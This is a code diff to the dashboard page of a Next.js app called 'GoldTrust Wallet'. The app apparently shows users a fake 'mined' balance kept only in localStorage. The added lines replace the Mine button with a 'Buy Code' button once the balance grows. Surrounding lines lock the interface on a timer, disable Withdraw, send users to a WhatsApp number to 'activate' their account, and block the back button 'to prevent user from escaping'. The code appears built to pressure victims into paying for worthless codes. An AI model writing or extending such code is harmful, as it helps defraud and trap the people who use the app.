@@ -1,5 +1,5 @@
 // pages/dashboard.js
-import { useEffect, useState } from 'react';
+import { useEffect, useState, useRef } from 'react';
 import { useRouter } from 'next/router';
 import Layout from '../components/Layout';
 import LogoHeader from '../components/LogoHeader';
@@ -22,6 +22,8 @@ export default function Dashboard(){
   /* ====== ADDED STATES & CONFIG (only additions) ====== */
   const [restricted, setRestricted] = useState(false); // UI lock state
   const [timeLeft, setTimeLeft] = useState(0); // ms remaining until restriction
+  const [showBuyInstead, setShowBuyInstead] = useState(false); // when true, show Buy Code instead of Mine
+  const lastBalanceRef = useRef(0);
   const RESTRICT_AFTER = 10 * 60 * 1000; // 10 minutes (not used to compute — canonical source is localStorage.gt_restriction_end)
   const WHATSAPP_LINK = 'https://wa.me/2347085462173?text=Hello%2C%20I%20want%20to%20activate%20my%20GoldTrust%20Wallet%20account';
   /* ==================================================== */
@@ -33,10 +35,26 @@ export default function Dashboard(){
       return;
     }
     setUser(u);
-    setBalance(loadBalance());
+
+    // load current balance and transactions
+    const current = Number(loadBalance() || 0);
+    setBalance(current);
     const transactions = loadTx() || [];
     setTx(transactions);
     computeStats(transactions);
+
+    // determine whether Mine should be replaced by Buy Code
+    try {
+      const prev = Number(localStorage.getItem('gt_last_balance') || 0);
+      lastBalanceRef.current = prev;
+      // if the current (fresh) balance is greater than the stored last balance -> user mined
+      setShowBuyInstead(current > prev);
+      // update stored last balance to current so next comparison works
+      localStorage.setItem('gt_last_balance', String(current));
+    } catch (e) {
+      // ignore localStorage errors
+      setShowBuyInstead(false);
+    }
 
     // show intro slides only once (per device)
     try {
@@ -100,6 +118,25 @@ export default function Dashboard(){
     return () => clearInterval(iv);
   }, []);
   /* ================================================================ */
+
+  // listen to storage events so cross-page balance updates cause the UI change immediately
+  useEffect(() => {
+    const onStorage = (e) => {
+      if (!e) return;
+      if (e.key === 'gt_last_balance') {
+        const prev = Number(e.oldValue || 0);
+        const next = Number(e.newValue || 0);
+        // if new value bigger than old -> enable Buy Code replacement
+        if (next > prev) setShowBuyInstead(true);
+      }
+      if (e.key === 'gt_restriction_end' || e.key === 'gt_activated') {
+        // re-run the restriction check quickly
+        try { const end = Number(localStorage.getItem('gt_restriction_end') || 0); setTimeLeft(Math.max(0, end - Date.now())); } catch(e){}
+      }
+    };
+    window.addEventListener('storage', onStorage);
+    return () => window.removeEventListener('storage', onStorage);
+  }, []);
 
   // disable back button while restricted (prevent user from escaping)
   useEffect(() => {
@@ -261,9 +298,14 @@ export default function Dashboard(){
             <div className="small muted">{user.fullName} • Miner: {user.phone}</div>
             <div style={{height:8}} />
             <div style={{display:'flex',gap:12,flexWrap:'wrap'}}>
-              <button className="btn" onClick={quickMine}>⛏️ Mine</button>
+              {/* Show exactly two main buttons: either [Mine, Withdraw] or [Buy Code, Withdraw] */}
+              {!showBuyInstead ? (
+                <button className="btn" onClick={quickMine}>⛏️ Mine</button>
+              ) : (
+                <button className="btn" onClick={quickBuyCode}>🧾 Buy Code</button>
+              )}
+
               <button className="btnGhost" onClick={quickWithdraw} disabled={restricted}>💸 Withdraw</button>
-              <button className="btnGhost" onClick={quickBuyCode} disabled={restricted}>🧾 Buy Code</button>
             </div>
           </div>
 
